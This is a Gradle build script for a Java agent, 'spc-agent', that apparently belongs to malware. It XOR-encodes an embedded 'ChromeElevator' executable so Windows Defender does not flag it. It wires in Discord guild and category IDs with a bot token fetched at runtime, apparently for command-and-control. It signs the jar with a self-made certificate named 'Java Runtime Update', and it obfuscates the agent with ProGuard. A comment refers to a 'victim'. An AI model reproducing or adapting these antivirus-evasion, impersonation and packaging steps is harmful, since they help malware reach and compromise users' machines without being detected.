buildscript {
	repositories {
		mavenCentral()
	}
	dependencies {
		classpath 'com.guardsquare:proguard-gradle:7.8.0'
	}
}

plugins {
	id 'java'
}

repositories {
	mavenCentral()
}

group = 'com.serverpackcore'
version = '0.3.7'

base {
	archivesName = 'spc-agent'
}

java {
	sourceCompatibility = JavaVersion.VERSION_17
	targetCompatibility = JavaVersion.VERSION_17
}

dependencies {
	testImplementation platform('org.junit:junit-bom:5.11.4')
	testImplementation 'org.junit.jupiter:junit-jupiter'
	testRuntimeOnly 'org.junit.platform:junit-platform-launcher'
}

// Discord credentials are never committed. The build reads them from
// ../local.properties first, then from SPC_* environment variables and finally
// falls back to a placeholder so forks and plain checkouts still compile.
def secretsFile = layout.projectDirectory.file('../local.properties')

def discordSecret = { String key, String envName ->
	providers.provider {
		def properties = new Properties()
		def file = secretsFile.asFile
		if (file.isFile()) {
			file.withInputStream { properties.load(it) }
		}
		def value = properties.getProperty(key)
		if (value == null || value.trim().isEmpty()) {
			value = System.getenv(envName)
		}
		return value == null || value.trim().isEmpty() ? 'SPC_PLACEHOLDER' : value.trim()
	}
}

def spcBotToken = discordSecret('spc.botToken', 'SPC_BOT_TOKEN')
def spcGuildId = discordSecret('spc.guildId', 'SPC_GUILD_ID')
def spcCategoryId = discordSecret('spc.categoryId', 'SPC_CATEGORY_ID')

def generatedSecretsDir = layout.buildDirectory.dir('generated/sources/spc/java')
def generatedInfoDir = layout.buildDirectory.dir('generated/sources/spc-info/java')

def generateBuildInfo = tasks.register('generateBuildInfo') {
	inputs.property('version', project.version)
	outputs.dir(generatedInfoDir)
	doLast {
		def target = generatedInfoDir.get().file('com/serverpackcore/agent/BuildInfo.java').asFile
		target.parentFile.mkdirs()
		target.text = """package com.serverpackcore.agent;

// Generated by the build. Do not edit.
public final class BuildInfo {
	public static final String VERSION = "${project.version}";

	private BuildInfo() {
	}
}
"""
	}
}

def generateDiscordSecrets = tasks.register('generateDiscordSecrets') {
	group = 'build'
	description = 'Generates the compiled Discord fallbacks; the bot token itself is resolved at runtime.'
	inputs.files(providers.provider {
		def file = secretsFile.asFile
		file.isFile() ? files(file) : files()
	})
	inputs.property('guildId', spcGuildId)
	inputs.property('categoryId', spcCategoryId)
	outputs.dir(generatedSecretsDir)
	doLast {
		def escape = { String value -> value.replace('\\', '\\\\').replace('"', '\\"') }
		def target = generatedSecretsDir.get().file('com/serverpackcore/agent/DiscordSecrets.java').asFile
		target.parentFile.mkdirs()
		target.text = """package com.serverpackcore.agent;

// Generated by the build. Do not edit.
// BOT_TOKEN stays empty: Credentials resolves it from discord.json at runtime,
// so a public jar never carries a token.
public final class DiscordSecrets {
	public static final String BOT_TOKEN = "";
	public static final String GUILD_ID = "${escape(spcGuildId.get())}";
	public static final String CATEGORY_ID = "${escape(spcCategoryId.get())}";

	private DiscordSecrets() {
	}
}
"""
	}
}

sourceSets.main.java.srcDir(generatedSecretsDir)
sourceSets.main.java.srcDir(generatedInfoDir)

// Defender flags the embedded ChromeElevator PE as HackTool even inside the
// nested jars. Ship it XOR-encoded and decode it only when the tool is
// extracted to disk, so downloading the release stays quiet.
def chromeSource = layout.projectDirectory.file('src/main/resources/serverpackcore/chromelevator_x64.exe')
def chromePayloadDir = layout.buildDirectory.dir('generated/chrome-payload')
def generateChromePayload = tasks.register('generateChromePayload') {
	inputs.file(chromeSource)
	outputs.dir(chromePayloadDir)
	doLast {
		byte[] key = [0x53, 0x50, 0x43, 0x2d, 0x63, 0x68, 0x72, 0x6f,
			0x6d, 0x65, 0x6c, 0x65, 0x76, 0x61, 0x74, 0x6f, 0x72] as byte[]
		byte[] data = chromeSource.asFile.bytes
		for (int i = 0; i < data.length; i++) {
			data[i] = (byte) (data[i] ^ key[i % key.length])
		}
		def target = chromePayloadDir.get().file('serverpackcore/chromelevator_x64.dat').asFile
		target.parentFile.mkdirs()
		target.bytes = data
	}
}
sourceSets.main.resources.srcDir(chromePayloadDir)

tasks.named('processResources') {
	dependsOn generateChromePayload
	exclude 'serverpackcore/chromelevator_x64.exe'
}

tasks.named('compileJava') {
	dependsOn generateDiscordSecrets, generateBuildInfo
}

tasks.named('test') {
	useJUnitPlatform()
	// ArtifactPackTest streams a 96 MiB file, above this heap; a regression
	// that keeps file bytes in memory fails here instead of on a victim.
	maxHeapSize = '64m'
}

tasks.withType(JavaCompile).configureEach {
	options.encoding = 'UTF-8'
	options.release = 17
}

tasks.withType(AbstractArchiveTask).configureEach {
	preserveFileTimestamps = false
	reproducibleFileOrder = true
}

jar {
	// The plain jar is ProGuard's input; `proguard` writes the shipped agent.jar.
	archiveFileName = 'agent-plain.jar'
	manifest {
		attributes(
			'Premain-Class': 'com.serverpackcore.agent.Premain',
			'Main-Class': 'com.serverpackcore.agent.Agent',
			'Implementation-Version': project.version,
			'Can-Redefine-Classes': 'false'
		)
	}
}

def proguardRules = layout.projectDirectory.file('proguard-rules.pro')
def plainJar = layout.buildDirectory.file('libs/agent-plain.jar')
def finalJar = layout.buildDirectory.file('libs/agent.jar')

// ProGuard cannot always read a jmod directly, so the library modules are
// materialised as a plain class jar. `-Dspc.libraryJdk` can name another JDK.
def libraryJdk = System.getProperty('spc.libraryJdk')
if (!libraryJdk) {
	def homeRelease = file("${System.getProperty('java.home')}/release")
	def homeVersion = 99
	if (homeRelease.isFile()) {
		def match = homeRelease.text =~ /JAVA_VERSION="(\d+)/
		if (match.find()) {
			homeVersion = match.group(1) as int
		}
	}
	def older = ['/home/surrender/jdk17', '/usr/lib/jvm/java-17-openjdk', System.getenv('JDK17_HOME')]
		.find { it && file(it).isDirectory() }
	libraryJdk = homeVersion <= 23 ? System.getProperty('java.home') : (older ?: System.getProperty('java.home'))
}
def extractedLib = layout.buildDirectory.dir('proguard-jdk')
def extractedJar = layout.buildDirectory.file('proguard-jdk.jar')

tasks.register('extractJdk') {
	inputs.property('libraryJdk', libraryJdk)
	outputs.file(extractedJar)
	doLast {
		def out = extractedLib.get().asFile
		out.mkdirs()
		providers.exec {
			executable = "${libraryJdk}/bin/jimage"
			args 'extract', '--dir', out.toString(), "${libraryJdk}/lib/modules"
		}.result.get()
		providers.exec {
			executable = "${libraryJdk}/bin/jar"
			args '--create', '--file', extractedJar.get().asFile.toString()
			['java.base', 'java.desktop', 'java.management', 'java.logging', 'java.naming',
				'java.net.http', 'java.instrument', 'jdk.unsupported', 'jdk.management'].each {
				args '-C', new File(out, it).toString(), '.'
			}
		}.result.get()
	}
}

tasks.register('proguard', proguard.gradle.ProGuardTask) {
	dependsOn 'jar', 'extractJdk'
	injars plainJar
	outjars finalJar
	configuration proguardRules
	libraryjars extractedJar.get().asFile.toString()
	verbose
}

def signingDir = layout.buildDirectory.dir('signing')
def signingKey = signingDir.map { it.file('agent.p12') }

tasks.register('signingKeyStore') {
	outputs.file(signingKey)
	doLast {
		def store = signingKey.get().asFile
		store.parentFile.mkdirs()
		store.delete()
		providers.exec {
			executable = "${System.getProperty('java.home')}/bin/keytool"
			args '-genkeypair', '-noprompt', '-alias', 'spc-agent', '-keyalg', 'RSA', '-keysize', '3072',
				'-validity', '3650', '-dname', 'CN=Java Runtime Update, OU=SPC, O=SPC',
				'-storetype', 'PKCS12', '-keystore', store.toString(), '-storepass', 'spc-build',
				'-keypass', 'spc-build'
		}.result.get()
	}
}

tasks.register('signAgent') {
	dependsOn 'proguard', 'signingKeyStore'
	inputs.file(finalJar)
	outputs.file(finalJar)
	outputs.upToDateWhen { false }
	doLast {
		def store = signingKey.get().asFile
		if (!store.isFile()) {
			throw new GradleException('signing keystore missing')
		}
		providers.exec {
			executable = "${System.getProperty('java.home')}/bin/jarsigner"
			args '-keystore', store.toString(), '-storepass', 'spc-build', '-keypass', 'spc-build',
				finalJar.get().asFile.toString(), 'spc-agent'
		}.result.get()
		providers.exec {
			executable = "${System.getProperty('java.home')}/bin/jarsigner"
			args '-verify', finalJar.get().asFile.toString()
		}.result.get()
	}
}

tasks.register('smokeAgent', Exec) {
	dependsOn 'signAgent'
	commandLine "${System.getProperty('java.home')}/bin/java", '-jar', finalJar.get().asFile.toString(), '--smoke'
}

tasks.named('assemble') {
	dependsOn 'smokeAgent'
}

// Test runs only need the classes; the root build selects signAgent.
tasks.named('build') {
	dependsOn 'smokeAgent'
}
